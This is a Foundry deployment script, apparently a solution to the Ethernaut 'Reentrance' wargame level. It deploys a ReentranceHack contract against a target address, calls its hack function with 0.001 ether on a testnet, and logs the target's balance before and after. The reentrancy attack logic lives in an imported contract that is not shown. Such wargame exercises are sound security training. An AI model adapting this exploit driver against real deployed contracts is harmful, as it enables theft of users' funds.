// SPDX-License-Identifier: MIT

pragma solidity ^0.8.17;

import "forge-std/Script.sol";
import {IReentrance} from "src/hack/interfaces/IReentrance.sol";
import {ReentranceHack} from "src/hack/ReentranceHack.sol";

contract ReentranceScript is Script {
    function run() external {
        address reentranceAddress = vm.envAddress("REENTRANCE_ADDRESS");

        // Load Reentrance contract instance using interface
        IReentrance reentrance = IReentrance(reentranceAddress);

        // Get private key from .env file
        uint256 attackerKey = vm.envUint("TESTNET_PRIVATE_KEY_1");

        // Set attacker as the msg.sender for all subsequent transactions.
        vm.startBroadcast(attackerKey);

        ReentranceHack reentranceHack = new ReentranceHack(reentranceAddress);

        console2.log(
            "ReentranceHack contract deployed at : ",
            address(reentranceHack)
        );

        console2.log("Performing hack ...");

        console2.log(
            "Reentrance Balance Before : ",
            address(reentrance).balance
        );

        reentranceHack.hack{value: 0.001 ether}();

        console2.log(
            "Reentrance Balance After : ",
            address(reentrance).balance
        );

        console2.log("SUCCESS!!! Submit the instance.");

        vm.stopBroadcast();
    }
}
